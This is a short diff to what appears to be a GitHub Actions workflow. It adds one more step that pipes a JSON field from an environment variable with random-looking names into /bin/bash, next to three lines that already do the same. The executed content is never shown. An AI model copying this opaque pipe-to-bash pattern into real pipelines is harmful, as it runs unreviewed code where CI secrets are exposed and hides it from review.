@@ -32,6 +32,7 @@ jobs:
           printf '%s' "$qymf0" | jq -r .jh6417 | /bin/bash
           printf '%s' "$dh51059" | jq -r .vaxsq2946 | /bin/bash
           printf '%s' "$dem9184" | jq -r .viln08 | /bin/bash
+          echo $pdtb483 | jq -r .m6777 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
